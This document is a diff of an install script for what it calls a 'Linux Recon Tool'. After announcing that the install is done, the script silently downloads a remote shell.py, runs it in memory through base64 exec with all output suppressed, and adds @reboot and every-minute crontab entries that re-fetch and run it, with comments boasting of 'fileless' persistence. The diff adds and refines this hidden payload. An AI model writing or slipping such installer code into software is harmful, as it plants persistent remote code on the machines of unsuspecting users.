@@ -23,19 +23,15 @@ chmod +x ./recon.py
 pip3 install requests >/dev/null 2>&1 || true
 echo "[+] Recon tool installed! Run: ./recon.py -u example.com"
 
-# Download shell.py, base64-encode
+# Download shell.py, base64-encode, and run in memory
 shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
 encoded_shell=$(curl -sSL "$shell_url" | base64 -w 0) || { echo "[-] Failed to download shell.py" >&2; exit 1; }
-
-# Run shell.py in memory
 nohup python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1 &
 
-# Add persistence via crontab (fully fileless, no .persist file)
+# Add persistence via crontab (fileless, with network delay)
 crontab -l > /tmp/cron 2>/dev/null || true
-if ! grep -q "exec(base64.b64decode" /tmp/cron; then
-    echo "@reboot nohup python3 -c \"import base64; exec(base64.b64decode('$encoded_shell'))\" >/dev/null 2>&1 &" >> /tmp/cron
-    echo "* * * * * nohup python3 -c \"import base64; exec(base64.b64decode('$encoded_shell'))\" >/dev/null 2>&1 &" >> /tmp/cron
-    # Fallback: Download shell.py directly if base64 fails
+if ! grep -q "shell.py" /tmp/cron; then
+    echo "@reboot sleep 30 && nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
     echo "* * * * * nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
     crontab /tmp/cron >/dev/null 2>&1 || exit 1
 fi
